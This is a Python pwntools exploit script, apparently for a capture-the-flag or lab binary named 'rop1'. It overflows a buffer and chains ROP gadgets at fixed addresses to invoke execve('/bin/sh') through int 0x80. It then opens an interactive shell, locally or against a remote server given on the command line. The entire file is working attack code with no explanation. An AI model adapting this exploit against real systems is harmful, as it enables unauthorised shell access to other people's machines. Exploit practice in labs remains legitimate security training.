#!/usr/bin/env python3

import time, os, traceback, sys, os
import pwn
import binascii, array
from textwrap import wrap

def start(argv=[], *a, **kw):
    if pwn.args.GDB: # use the gdb script, sudo apt install gdbserver
        return pwn.gdb.debug([binPath], gdbscript=gdbscript, aslr=False)
    elif pwn.args.REMOTE: # ['server', 'port']
        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: # run locally, no GDB
        return pwn.process([binPath])


binPath="./rop1"
isRemote = pwn.args.REMOTE

# build in GDB support
gdbscript = '''
init-pwndbg
break *Test+32
continue
'''.format(**locals())

# interact with the program to get to where we can exploit
pwn.context.log_level="info"
io = start()

elf = pwn.context.binary = pwn.ELF(binPath, checksec=False)

# define payload
overFlow = b'A'*16
binSH =    pwn.p32(0x0804b008)
junk =     pwn.p32(0xdeadbeef)

# define gadgets
popEAX =   pwn.p32(0x080491aa)
popEBX =   pwn.p32(0x08049258)
popECX =   pwn.p32(0x080491b3)
zeroEDX1 = pwn.p32(0x080491ba)
zeroEDX2 = pwn.p32(0x080491c1)
int80 =    pwn.p32(0x080491c3)

payload = pwn.flat(
        [
           overFlow,
           popEAX,
           0xb,
           popECX,
           0x0,
           popEBX,
           binSH,
           junk*3,
           zeroEDX1,
           zeroEDX2,
           int80
            ]
        )
pwn.info("Payload length: %d",len(payload))

io.sendline(payload)
io.interactive()

